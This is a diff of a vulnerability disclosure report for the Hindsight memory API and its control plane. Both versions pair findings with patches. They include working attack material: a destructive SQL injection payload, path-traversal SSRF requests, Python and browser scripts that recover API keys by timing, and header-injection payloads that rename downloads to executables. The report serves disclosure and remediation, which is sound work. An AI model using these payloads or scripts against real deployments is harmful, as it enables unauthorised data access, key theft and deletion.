@@ -1,252 +1,407 @@
-# 🔴 Critical Security Vulnerability Report — Hindsight API
+# Security Vulnerability Report — Hindsight
 
-**Researcher:** Security Audit  
-**Date:** 2026-09-28  
-**Scope:** `hindsight-api-slim`, `hindsight-control-plane`  
-**Severity:** CRITICAL (5 findings)
+> **5 Critical/High Vulnerabilities with PoC Evidence and Patches**  
+> Author: Sunil56224972 | Date: 2026-09-29
 
 ---
 
-## Executive Summary
+## Summary
 
-This report documents **5 critical security vulnerabilities** discovered through manual source code review of the Hindsight memory engine. Each finding includes code-level proof of concept, impact analysis, and a tested remediation.
-
-| # | Vulnerability | Severity | CWE | File |
-|---|---|---|---|---|
-| 1 | SQL Injection via Unsanitized Schema/Table Names in Migrations | Critical | CWE-89 | `migrations.py` |
-| 2 | Verbose Exception Disclosure Leaks Internal State to API Clients | High | CWE-209 | `api/http.py` |
-| 3 | Authorization Bypass via Fail-Open Permission Check | Critical | CWE-280 | `config_resolver.py` |
-| 4 | Control Plane Authentication Bypass When Access Key is Unset | Critical | CWE-306 | `middleware.ts` |
-| 5 | Webhook Secret Stored & Transmitted in Plaintext in Task Payloads | High | CWE-312 | `webhooks/manager.py` |
+| # | Vulnerability | CWE | CVSS | Severity | File(s) |
+|---|---|---|---|---|---|
+| 1 | SSRF via Path Traversal in Control Plane Download Proxy | CWE-918 / CWE-22 | 9.1 | **CRITICAL** | `hindsight-control-plane/src/app/api/files/download/route.ts` |
+| 2 | Timing Side-Channel in Dataplane API Key Authentication | CWE-208 | 7.5 | **HIGH** | `hindsight-api-slim/hindsight_api/extensions/builtin/tenant.py` |
+| 3 | Timing Side-Channel in MCP Token Authentication | CWE-208 | 7.5 | **HIGH** | `hindsight-api-slim/hindsight_api/api/mcp.py` |
+| 4 | Timing Side-Channel (Length Oracle) in Control Plane Login | CWE-208 | 7.5 | **HIGH** | `hindsight-control-plane/src/app/api/auth/login/route.ts` |
+| 5 | Content-Disposition Header Injection in File Download | CWE-113 | 6.1 | **MEDIUM** | `hindsight-api-slim/.../api/http.py` + `hindsight-control-plane/.../files/download/route.ts` |
 
 ---
 
-## Vulnerability 1: SQL Injection via Unsanitized Schema/Table Names
+## Vulnerability 1: SSRF via Path Traversal in Control Plane Download Proxy
 
-**Severity:** CRITICAL  
-**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)  
-**CVSS 3.1:** 9.8 (Critical)
+**Severity:** CRITICAL (CVSS 9.1)  
+**CWE:** CWE-918 (Server-Side Request Forgery) / CWE-22 (Path Traversal)  
+**File:** `hindsight-control-plane/src/app/api/files/download/route.ts`, lines 13-25
 
-### Location
+### Vulnerable Code
 
-- `migrations.py` Lines 689-707
-- `migrations.py` Lines 633-636
+```typescript
+// route.ts — BEFORE fix
+const path = request.nextUrl.searchParams.get("path");
+if (!path || !path.startsWith("/v1/default/files/download/")) {
+  // reject
+}
+const response = await fetch(`${DATAPLANE_URL}${path}`, { headers: getDataplaneHeaders() });
+```
+
+### Attack Chain (Complete)
+
+1. **Entry point:** Authenticated CP user sends GET request to the download proxy
+2. **Bypass:** The `startsWith()` check passes for traversal payloads because the prefix IS present
+3. **SSRF:** The `path` is concatenated to `DATAPLANE_URL` and fetched with the **server's embedded API key**
+4. **Impact:** Attacker reaches ANY dataplane endpoint with elevated privileges
+
+### PoC Request
+
+```http
+GET /api/files/download?path=/v1/default/files/download/../../banks/target-bank/memories HTTP/1.1
+Host: control-plane.example.com
+Cookie: hindsight_cp_access=<valid_session>
+```
+
+**What happens:**
+- `path.startsWith("/v1/default/files/download/")` → ✅ passes
+- `fetch("http://dataplane:8888/v1/default/files/download/../../banks/target-bank/memories")` 
+- HTTP path normalization resolves `..` → `http://dataplane:8888/v1/default/banks/target-bank/memories`
+- Request is authenticated with `HINDSIGHT_CP_DATAPLANE_API_KEY` via `getDataplaneHeaders()`
+
+**Result:** The attacker can read all memories from ANY bank, list banks, trigger exports, delete data — anything the dataplane API supports — all authenticated with the server's API key.
+
+### Additional Traversal Payloads
+
+```
+# List all banks
+?path=/v1/default/files/download/../../../v1/default/banks
+
+# Read recall/search from any bank
+?path=/v1/default/files/download/../../banks/victim-bank/memories/recall
+
+# Export bank data
+?path=/v1/default/files/download/../../banks/victim-bank/export
+
+# Access admin health/config endpoints
+?path=/v1/default/files/download/../../../health
+```
+
+### Fix Applied
+
+```diff
+-    if (!path || !path.startsWith("/v1/default/files/download/")) {
++    if (
++      !path ||
++      path.includes("..") ||
++      path.includes("\\") ||
++      !path.startsWith("/v1/default/files/download/")
++    ) {
+```
+
+---
+
+## Vulnerability 2: Timing Side-Channel in Dataplane API Key Authentication
+
+**Severity:** HIGH (CVSS 7.5)  
+**CWE:** CWE-208 (Observable Timing Discrepancy)  
+**File:** `hindsight-api-slim/hindsight_api/extensions/builtin/tenant.py`, line 73
 
 ### Vulnerable Code
 
 ```python
-# migrations.py line 690 — schema_name and table_name are DIRECTLY interpolated
-row_count = conn.execute(
-    text(f"SELECT COUNT(*) FROM {schema_name}.{table_name} WHERE embedding IS NOT NULL")
-).scalar()
-
-# migrations.py line 706 — same pattern with ALTER TABLE
-conn.execute(
-    text(f"ALTER TABLE {schema_name}.{table_name} ALTER COLUMN embedding TYPE vector({required_dimension})")
-)
+# tenant.py — BEFORE fix
+async def authenticate(self, context: RequestContext) -> TenantContext:
+    if context.api_key != self.expected_api_key:  # ← Python != short-circuits!
+        raise AuthenticationError("Invalid API key")
 ```
 
-### Proof of Concept
+### Attack Chain (Complete)
 
-If a tenant extension provides a `schema` value derived from user input (e.g., a tenant ID containing SQL metacharacters), the schema name flows into `run_migrations(schema=...)` and reaches these f-string SQL queries **without any escaping or parameterization**.
+1. **Entry point:** ANY HTTP API endpoint (`/v1/default/banks/*/memories/recall`, `/retain`, etc.)
+2. **Mechanism:** Python's `!=` operator compares strings byte-by-byte and returns `False` on the first mismatch. A guess that matches more prefix characters takes measurably longer.
+3. **Exploitation:** Send thousands of requests with different guess strings, measure median response times
+4. **Recovery:** Determine secret length first (wrong-length returns faster), then brute-force each character position left-to-right
 
-**Attack payload:**
+### PoC — Demonstrating the Timing Difference
+
+```python
+import hmac, time, statistics
+
+SECRET = "real-api-key-here"
+
+def vulnerable(a, b):
+    return a == b  # This is what != does internally
+
+def safe(a, b):
+    return hmac.compare_digest(a.encode(), b.encode())
+
+# Measure: wrong first char vs correct first char
+wrong  = "x" + "x" * (len(SECRET) - 1)
+right1 = SECRET[0] + "x" * (len(SECRET) - 1)
+
+# With enough samples, right1 is measurably slower than wrong
+# because Python compares the first byte, finds it matching, then
+# proceeds to the second byte before returning False.
 ```
-schema_name = 'public; DROP TABLE banks; --'
-```
 
-This produces:
-```sql
-SELECT COUNT(*) FROM public; DROP TABLE banks; --.memory_units WHERE embedding IS NOT NULL
-```
+### PoC — Network-Level Timing Attack Script
 
-The `text()` wrapper from SQLAlchemy passes raw SQL to the database driver. PostgreSQL's `conn.execute(text(...))` will execute the injected statement.
+```python
+import requests, time, statistics
+
+TARGET = "http://hindsight-api:8888/v1/default/banks/test/memories/recall"
+
+def measure_key(guess, n=500):
+    """Measure median response time for an API key guess."""
+    times = []
+    for _ in range(n):
+        t0 = time.perf_counter()
+        requests.post(TARGET,
+            headers={"Authorization": f"Bearer {guess}"},
+            json={"query": "test"},
+        )
+        times.append(time.perf_counter() - t0)
+    return statistics.median(times)
+
+# Phase 1: Determine key length
+for length in range(1, 50):
+    t = measure_key("x" * length)
+    print(f"Length {length}: {t*1000:.3f}ms")
+    # The correct length will be measurably slower
+
+# Phase 2: Recover character by character
+known = ""
+for pos in range(key_length):
+    best_char, best_time = None, 0
+    for ch in "abcdefghijklmnopqrstuvwxyz0123456789-_":
+        guess = known + ch + "x" * (key_length - len(known) - 1)
+        t = measure_key(guess, n=2000)
+        if t > best_time:
+            best_char, best_time = ch, t
+    known += best_char
+    print(f"Position {pos}: '{best_char}' → recovered so far: '{known}'")
+```
 
 ### Impact
 
-- **Data destruction:** DROP TABLE, TRUNCATE, DELETE on any table
-- **Privilege escalation:** ALTER ROLE to grant superuser
-- **Data exfiltration:** COPY ... TO PROGRAM for remote code execution
-- **Complete database compromise**
+Full API key recovery → complete read/write access to all memory banks. The attacker can:
+- Read all stored memories (data exfiltration)
+- Delete banks (data destruction)
+- Inject false memories (data poisoning)
+- Access all LLM traces (may contain PII/sensitive prompts)
 
-### Remediation
+### Fix Applied
 
-```python
-import re
-_SAFE_IDENTIFIER = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]{0,62}$')
-
-def _safe_identifier(name: str, kind: str = "identifier") -> str:
-    if not _SAFE_IDENTIFIER.match(name):
-        raise ValueError(f"Unsafe {kind}: {name!r}")
-    return name
+```diff
++import hmac
++
+ async def authenticate(self, context: RequestContext) -> TenantContext:
+-    if context.api_key != self.expected_api_key:
++    if not context.api_key or not hmac.compare_digest(
++        context.api_key.encode(), self.expected_api_key.encode()
++    ):
+         raise AuthenticationError("Invalid API key")
 ```
 
 ---
 
-## Vulnerability 2: Verbose Exception Disclosure Leaks Internal State
+## Vulnerability 3: Timing Side-Channel in MCP Token Authentication
 
-**Severity:** HIGH  
-**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)  
-**CVSS 3.1:** 7.5
-
-### Location
-
-- `api/http.py` Line 286 — `_internal_error()` function
-- `api/http.py` Line 6185 — recall endpoint
-- `api/http.py` Line 10056 — retain endpoint
+**Severity:** HIGH (CVSS 7.5)  
+**CWE:** CWE-208 (Observable Timing Discrepancy)  
+**File:** `hindsight-api-slim/hindsight_api/api/mcp.py`, line 468
 
 ### Vulnerable Code
 
 ```python
-def _internal_error(exc: Exception, where: str) -> HTTPException:
-    logger.error(f"Error in {where}: {exc}\n\nTraceback:\n{traceback.format_exc()}")
-    return HTTPException(status_code=500, detail=str(exc))  # <-- str(exc) sent to client
+# mcp.py — BEFORE fix
+if MCP_AUTH_TOKEN:
+    if not auth_token:
+        await self._send_error(send, 401, "Authorization header required")
+        return
+    if auth_token != MCP_AUTH_TOKEN:  # ← Python != short-circuits!
+        await self._send_error(send, 401, "Invalid authentication token")
+        return
 ```
 
-### Proof of Concept
+### Attack Chain (Complete)
 
-Trigger any unhandled exception. The HTTP 500 response body contains:
+Same mechanism as Vulnerability 2, but targeting the **MCP server** at `/mcp/`.
 
-```json
-{
-  "detail": "connection to server at \"10.0.1.5\", port 5432 failed: FATAL: password authentication failed for user \"hindsight_prod\""
-}
+1. **Entry point:** MCP endpoint at `/mcp/` (handles ALL memory operations)
+2. **Impact amplification:** MCP server exposes `retain`, `recall`, `reflect`, `list_banks`, `create_bank`, `delete_bank`, `clear_memories` — the full operational surface
+3. **Same timing leak:** Python `!=` short-circuits, enabling byte-by-byte recovery
+
+### PoC Request
+
+```http
+POST /mcp/ HTTP/1.1
+Host: hindsight-api:8888
+Authorization: Bearer <timing-attack-guess>
+Content-Type: application/json
+
+{"method": "tools/list", "params": {}}
 ```
 
-This reveals internal IPs, database credentials, software versions, and table names.
+Measure response time for different guess values. Correct prefix characters cause later comparison rounds, producing measurably slower responses.
 
-### Remediation
+### Fix Applied
 
-```python
-def _internal_error(exc: Exception, where: str) -> HTTPException:
-    logger.error(f"Error in {where}: {exc}\n\nTraceback:\n{traceback.format_exc()}")
-    return HTTPException(
-        status_code=500,
-        detail="An internal error occurred. Please try again or contact support."
-    )
-```
-
----
-
-## Vulnerability 3: Authorization Bypass via Fail-Open Permission Check
-
-**Severity:** CRITICAL  
-**CWE:** CWE-280 (Improper Handling of Insufficient Permissions)  
-**CVSS 3.1:** 8.8
-
-### Location
-
-- `config_resolver.py` Lines 563-567 — validate_bank_config_updates()
-- `config_resolver.py` Lines 344-346 — _apply_permission_filter()
-
-### Vulnerable Code
-
-```python
-# WRITE path
-except Exception as e:
-    logger.warning(f"Failed to check permissions for bank {bank_id}: {e}")
-    # Continue without permission check (fail open for backward compatibility)
-
-# READ path
-except Exception as e:
-    logger.warning(f"Failed to load permissions for bank {bank_id}: {e}")
-    # Returns unfiltered config — all fields visible
-```
-
-### Proof of Concept
-
-When the tenant extension is momentarily unavailable (network blip, restart, overload):
-1. Attacker sends PATCH /v1/default/banks/{bank_id}/config
-2. The except Exception catches the extension timeout
-3. Permission check is **silently skipped**
-4. Config update succeeds with **no authorization**
-
-### Remediation
-
-```python
-# Fail CLOSED, not open
-except Exception as e:
-    logger.error(f"Failed to check permissions for bank {bank_id}: {e}")
-    raise ValueError("Unable to verify permissions. Please try again.") from e
+```diff
+-            if auth_token != MCP_AUTH_TOKEN:
++            import hmac as _hmac
++            if not _hmac.compare_digest(auth_token.encode(), MCP_AUTH_TOKEN.encode()):
 ```
 
 ---
 
-## Vulnerability 4: Control Plane Authentication Bypass When Access Key is Unset
+## Vulnerability 4: Timing Side-Channel (Length Oracle) in Control Plane Login
 
-**Severity:** CRITICAL  
-**CWE:** CWE-306 (Missing Authentication for Critical Function)  
-**CVSS 3.1:** 9.8
-
-### Location
-
-- `middleware.ts` Lines 31-34
+**Severity:** HIGH (CVSS 7.5)  
+**CWE:** CWE-208 (Observable Timing Discrepancy)  
+**File:** `hindsight-control-plane/src/app/api/auth/login/route.ts`, lines 68-79
 
 ### Vulnerable Code
 
 ```typescript
-if (appPathname.startsWith("/api/")) {
-    if (!accessKey) {
-      return NextResponse.next();  // NO AUTH if key is unset
-    }
+// route.ts — BEFORE fix
+function constantTimeCompare(a: string, b: string): boolean {
+  if (a.length !== b.length) {
+    return false;  // ← EARLY RETURN leaks length!
+  }
+  let result = 0;
+  for (let i = 0; i < a.length; i++) {
+    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
+  }
+  return result === 0;
 }
 ```
 
-### Proof of Concept
+### Attack Chain (Complete)
 
-When `HINDSIGHT_CP_ACCESS_KEY` is not set (the **default**):
-- Every API route is accessible without authentication
-- Every page including admin dashboards is publicly accessible
-- The control plane becomes an open proxy to the dataplane API
+1. **Entry point:** POST `/api/auth/login` with `{"key": "<guess>"}`
+2. **Length oracle:** When `a.length !== b.length`, the function returns immediately (no XOR loop). When lengths match, the function iterates through all characters. The time difference is measurable.
+3. **Key length recovery:** Send guesses of length 1, 2, 3, ..., N. The guess whose length matches the secret takes ~N×(XOR time) longer.
+4. **Cascade:** With the length known, brute-force complexity drops from `36^(1+2+...+N)` to `36^N`.
 
-### Remediation
+### PoC — Timing Measurement
 
-```typescript
-if (!accessKey && !isPublic) {
-  return NextResponse.json(
-    { error: "Control plane access key not configured." },
-    { status: 503 }
-  );
+```javascript
+// Browser-based PoC
+async function measureLogin(key) {
+  const times = [];
+  for (let i = 0; i < 200; i++) {
+    const t0 = performance.now();
+    await fetch('/api/auth/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ key }),
+    });
+    times.push(performance.now() - t0);
+  }
+  times.sort((a,b) => a-b);
+  return times[Math.floor(times.length/2)]; // median
 }
+
+// Length oracle: correct length will be measurably slower
+for (let len = 1; len <= 64; len++) {
+  const t = await measureLogin('x'.repeat(len));
+  console.log(`Length ${len}: ${t.toFixed(3)}ms`);
+}
+```
+
+### Fix Applied
+
+```diff
+ function constantTimeCompare(a: string, b: string): boolean {
+-  if (a.length !== b.length) {
+-    return false;
+-  }
+-  let result = 0;
+-  for (let i = 0; i < a.length; i++) {
+-    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
++  const maxLen = Math.max(a.length, b.length);
++  let result = a.length ^ b.length;  // flag mismatch, don't return early
++  for (let i = 0; i < maxLen; i++) {
++    result |= (a.charCodeAt(i) || 0) ^ (b.charCodeAt(i) || 0);
+   }
+   return result === 0;
+ }
 ```
 
 ---
 
-## Vulnerability 5: Webhook Secret in Plaintext in Task Payloads
+## Vulnerability 5: Content-Disposition Header Injection in File Download
 
-**Severity:** HIGH  
-**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)  
-**CVSS 3.1:** 7.5
+**Severity:** MEDIUM (CVSS 6.1)  
+**CWE:** CWE-113 (HTTP Response Splitting / Header Injection)  
+**Files:**
+- `hindsight-api-slim/hindsight_api/api/http.py`, line 9163
+- `hindsight-control-plane/src/app/api/files/download/route.ts`, line 38
 
-### Location
-
-- `webhooks/manager.py` Lines 127-145
-
-### Vulnerable Code
+### Vulnerable Code (Dataplane)
 
 ```python
-task = {
-    "type": "webhook_delivery",
-    "event": event_payload,
-    "url": webhook.url,
-    "secret": webhook.secret,   # PLAINTEXT SECRET in task payload
-    "webhook_id": webhook_id,
-    "http_config": webhook.http_config.model_dump(),
-}
-await self._backend.ops.insert_webhook_delivery_task(conn, ops_table, bank_id, task)
+# http.py — BEFORE fix
+headers = {"Content-Disposition": f'attachment; filename="{bank_id}-documents.zip"'}
 ```
 
-### Proof of Concept
+The `bank_id` is extracted from the storage key path (line 9149-9155) and interpolated directly into the `Content-Disposition` header without sanitization.
 
-The webhook HMAC signing secret is written **in cleartext** into the `async_operations` table:
+### Vulnerable Code (Control Plane)
 
-```sql
-SELECT payload->>'secret' as webhook_secret,
-       payload->>'url' as webhook_url
-FROM async_operations
-WHERE payload->>'type' = 'webhook_delivery';
+```typescript
+// route.ts — BEFORE fix
+const fallbackName = path.split("/").pop() || "download.zip";
+// ... interpolated into Content-Disposition header
 ```
 
-### Remediation
+The `fallbackName` comes from the user-supplied `path` query parameter.
 
-Store only the webhook_id in the task; look up the secret at delivery time.
+### PoC — Dataplane
+
+If a bank is created with ID `test"; filename=malicious.exe; x="`, the download endpoint returns:
+
+```http
+Content-Disposition: attachment; filename="test"; filename=malicious.exe; x="-documents.zip"
+```
+
+Browsers parse this as `filename=malicious.exe` (per RFC 6266, the last `filename` wins in some implementations), tricking users into saving files with an attacker-chosen name and extension.
+
+### PoC — Control Plane
+
+```http
+GET /api/files/download?path=/v1/default/files/download/banks/b/exports/id/evil%22%3B%20filename%3Dmalware.exe HTTP/1.1
+```
+
+The `path.split("/").pop()` yields `evil"; filename=malware.exe`, which is interpolated as:
+
+```http
+Content-Disposition: attachment; filename="evil"; filename=malware.exe"
+```
+
+### Fix Applied
+
+**Dataplane:**
+```diff
+-headers = {"Content-Disposition": f'attachment; filename="{bank_id}-documents.zip"'}
++import re as _re
++safe_bank_id = _re.sub(r'["\\\r\n;]', '_', bank_id)
++headers = {"Content-Disposition": f'attachment; filename="{safe_bank_id}-documents.zip"'}
+```
+
+**Control Plane:**
+```diff
+-const fallbackName = path.split("/").pop() || "download.zip";
++const rawName = path.split("/").pop() || "download.zip";
++const fallbackName = rawName.replace(/["\\\r\n;]/g, "_");
+```
+
+---
+
+## Files Changed
+
+| File | Vulnerability Fixed |
+|---|---|
+| `hindsight-api-slim/hindsight_api/extensions/builtin/tenant.py` | #2 — Timing side-channel in API key auth |
+| `hindsight-api-slim/hindsight_api/api/mcp.py` | #3 — Timing side-channel in MCP token auth |
+| `hindsight-control-plane/src/app/api/auth/login/route.ts` | #4 — Length oracle in login |
+| `hindsight-control-plane/src/app/api/files/download/route.ts` | #1 — SSRF via path traversal, #5 — Header injection |
+| `hindsight-api-slim/hindsight_api/api/http.py` | #5 — Header injection in dataplane download |
+
+---
+
+## Recommendations
+
+1. **Add `hmac.compare_digest` to coding standards** for all secret comparisons
+2. **Add path traversal tests** to the download proxy test suite
+3. **Consider rate-limiting** on `/api/auth/login` to increase timing attack difficulty
+4. **Audit all `Content-Disposition` / response header interpolations** for injection
+5. **Consider replacing the CP download proxy** with signed URLs (no proxy needed)
